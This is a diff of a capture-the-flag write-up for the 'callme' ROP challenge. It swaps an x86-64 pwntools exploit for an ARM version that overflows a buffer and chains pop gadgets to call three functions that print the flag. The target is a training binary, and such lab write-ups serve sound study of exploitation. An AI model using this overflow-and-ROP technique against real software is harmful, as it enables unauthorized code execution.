@@ -2,66 +2,56 @@
 
 there exist three "callme" function in this binary
 
-![](./callme%201-1782440043403.webp)
+![](../img/callme%201-1782440043403.webp)
 
 upon inspection in ida, it seems that those call me function check r0,r1,r2 for specific values and each print out part of the flag
 
-![](./callme%201-1782440070948.webp)
+![](../img/callme%201-1782440070948.webp)
 
-with a gadget to manipulate those register
+with a gadget to manipulate those registers, a simple ROP chain is enough to solve this challenge
 
 
 ```
-#!/usr/bin/env python3
-
+#!/usr/bin/python3
 from pwn import *
 
-exe = ELF("./callme")
+context.os="linux"
+context.log_level="debug"
 
-context.binary = exe
-context.log_level = "debug"
+context.binary=exe=ELF("./callme_armv5-hf")
 
-script = '''
-b*main+271
-c
-'''
+p=process(["qemu-arm","-L", "/usr/arm-linux-gnueabihf","-g","1234","./callme_armv5-hf"])
+p=process(["qemu-arm","./callme_armv5-hf"])
 
-def main():
-    # r = gdb.debug(exe.path, gdbscript=script)
-    r = process(exe.path)
+buffer=0x20*b"A"
+pop_r0r1r2lrpc=0x00010870
 
-    pop_rdi=0x00000000004009a3
-    pop_rsi_pop_rdx=0x000000000040093d
-    buffer=b"A"*0x28
+payload=flat(
+    buffer,
+    0,
 
-    payload=flat(
-        buffer,
-        pop_rdi,
-        0xdeadbeefdeadbeef,
-        pop_rsi_pop_rdx,
-        0xcafebabecafebabe,
-        0xd00df00dd00df00d,
-        exe.sym["callme_one"],
-        pop_rdi,
-        0xdeadbeefdeadbeef,
-        pop_rsi_pop_rdx,
-        0xcafebabecafebabe,
-        0xd00df00dd00df00d,
-        exe.sym["callme_two"],
-        pop_rdi,
-        0xdeadbeefdeadbeef,
-        pop_rsi_pop_rdx,
-        0xcafebabecafebabe,
-        0xd00df00dd00df00d,
-        exe.sym["callme_three"]
-    )
+    pop_r0r1r2lrpc,
+    0xdeadbeef,
+    0xcafebabe,
+    0xd00df00d,
+    pop_r0r1r2lrpc,
+    exe.plt["callme_one"],
 
-    time.sleep(0.1)
-    r.send(payload)
+    0xdeadbeef,
+    0xcafebabe,
+    0xd00df00d,
+    pop_r0r1r2lrpc,
+    exe.plt["callme_two"],
 
-    r.interactive()
+    0xdeadbeef,
+    0xcafebabe,
+    0xd00df00d,
+    0,
+    exe.plt["callme_three"]
+)
 
-if __name__ == "__main__":
-    main()
+p.recvuntil("> ")
+p.send(payload)
 
+p.interactive()
 ```
